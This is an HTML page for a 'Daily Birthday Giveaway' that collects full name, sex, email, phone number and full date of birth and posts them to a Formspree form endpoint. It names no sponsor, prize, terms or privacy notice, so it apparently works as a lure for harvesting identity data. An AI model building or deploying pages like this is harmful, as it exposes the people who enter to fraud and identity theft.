<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Birthday Giveaway</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;800&display=swap" rel="stylesheet">

<style>

body {
    margin: 0;
    font-family: 'Poppins', sans-serif;
    background: radial-gradient(circle at 20% 30%, #ff00cc, transparent 40%),
                radial-gradient(circle at 80% 70%, #00f5ff, transparent 40%),
                linear-gradient(-45deg, #ff0080, #ff8c00, #00f5ff, #ff0000);
    background-size: 400% 400%;
    animation: bgMove 5s ease infinite;
    overflow-x: hidden;
}

@keyframes bgMove {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}

/* Firework Pulse Glow */
body::after {
    content: "";
    position: fixed;
    inset: 0;
    background: radial-gradient(circle, rgba(255,255,255,0.15), transparent 60%);
    animation: pulseGlow 3s infinite;
    pointer-events: none;
}

@keyframes pulseGlow {
    0% { opacity: 0.4; }
    50% { opacity: 0.8; }
    100% { opacity: 0.4; }
}

/* Confetti */
.confetti {
    position: fixed;
    top: -20px;
    border-radius: 3px;
    opacity: 0.9;
    animation: fall linear infinite;
    z-index: 1;
}

@keyframes fall {
    100% {
        transform: translateY(110vh) rotate(1080deg);
    }
}

/* Layout */
.wrapper {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
    position: relative;
    z-index: 5;
}

/* Card */
.card {
    background: rgba(255,255,255,0.15);
    backdrop-filter: blur(20px);
    border: 2px solid rgba(255,255,255,0.3);
    padding: 50px 40px;
    border-radius: 30px;
    width: 100%;
    max-width: 520px;
    text-align: center;
    box-shadow: 0 0 40px rgba(255,255,255,0.5),
                0 0 80px rgba(255,0,128,0.6);
    animation: bounceIn 0.6s ease;
    color: white;
}

@keyframes bounceIn {
    0% { transform: scale(0.6); opacity: 0; }
    60% { transform: scale(1.2); }
    100% { transform: scale(1); opacity: 1; }
}

.badge {
    background: linear-gradient(90deg, #ff00cc, #ff8c00);
    padding: 12px 30px;
    border-radius: 50px;
    font-weight: 800;
    margin-bottom: 25px;
    box-shadow: 0 0 20px #ff00cc;
}

h1 {
    font-size: 42px;
    margin-bottom: 15px;
    animation: wiggle 3s infinite;
}

@keyframes wiggle {
    0%,100% { transform: rotate(0deg); }
    25% { transform: rotate(-2deg); }
    75% { transform: rotate(2deg); }
}

.sub {
    margin-bottom: 30px;
    font-size: 16px;
}

/* Inputs */
input, select {
    width: 100%;
    padding: 15px;
    margin: 10px 0;
    border-radius: 12px;
    border: none;
    font-size: 15px;
}

.row {
    display: flex;
    gap: 10px;
}

.row input {
    flex: 1;
}

.phone-group {
    display: flex;
    gap: 8px;
}

.phone-group select {
    width: 100px;
}

.phone-group input {
    flex: 1;
}

.dob-group {
    display: flex;
    gap: 10px;
}

/* Button */
button {
    width: 100%;
    padding: 20px;
    margin-top: 20px;
    border: none;
    border-radius: 15px;
    background: linear-gradient(90deg, #ff00cc, #ff8c00);
    color: white;
    font-size: 22px;
    font-weight: 800;
    cursor: pointer;
    position: relative;
    overflow: hidden;
}

button::after {
    content: "";
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: rgba(255,255,255,0.4);
    transform: skewX(-20deg);
    animation: shine 2s infinite;
}

@keyframes shine {
    100% { left: 200%; }
}

button:hover {
    transform: scale(1.1);
    box-shadow: 0 25px 50px rgba(255,0,128,0.7);
}

</style>
</head>

<body>

<script>
/* HEAVY CONFETTI RAIN */
setInterval(() => {
    for (let i = 0; i < 20; i++) {
        let confetti = document.createElement("div");
        confetti.classList.add("confetti");
        confetti.style.left = Math.random() * 100 + "vw";
        confetti.style.width = (Math.random() * 10 + 6) + "px";
        confetti.style.height = (Math.random() * 6 + 4) + "px";
        confetti.style.background = ["#ff00cc","#ff8c00","#00f5ff","#ffffff","#ffff00"][Math.floor(Math.random()*5)];
        confetti.style.animationDuration = (Math.random() * 3 + 2) + "s";
        document.body.appendChild(confetti);
        setTimeout(() => confetti.remove(), 5000);
    }
}, 300);
</script>

<div class="wrapper">
<div class="card">

<div class="badge">🎉 DAILY BIRTHDAY GIVEAWAY!! 🎉</div>

<h1>WIN BIG ON YOUR **BIRTHDAY**</h1>
<div class="sub">Enter once. Win every year.</div>

<form id="entryForm">

<div class="row">
<input type="text" name="first_name" placeholder="First Name" required>
<input type="text" name="surname" placeholder="Surname" required>
</div>

<select name="sex" required>
<option value="" disabled selected>Select Sex</option>
<option value="Male">Male</option>
<option value="Female">Female</option>
<option value="Other">Other</option>
<option value="Prefer not to say">Prefer not to say</option>
</select>

<input type="email" name="email" placeholder="Email Address" required>

<div class="phone-group">
<select name="country_code" required>
<option value="+61">+61</option>
<option value="+1">+1</option>
<option value="+44">+44</option>
<option value="+64">+64</option>
</select>
<input type="tel" name="phone" placeholder="Phone Number" required>
</div>

<div class="dob-group">
<input type="text" name="dob_day" placeholder="DD" maxlength="2" required>
<input type="text" name="dob_month" placeholder="MM" maxlength="2" required>
<input type="text" name="dob_year" placeholder="YYYY" maxlength="4" required>
</div>

<button type="submit">ENTER NOW 🚀</button>

</form>

</div>
</div>

<script>
document.getElementById("entryForm").addEventListener("submit", async function(e) {
e.preventDefault();
const formData = new FormData(this);
await fetch("https://formspree.io/f/xpqjgdww", {
method: "POST",
body: formData,
headers: { 'Accept': 'application/json' }
});
window.location.href = "thankyou.html";
});
</script>

</body>
</html>
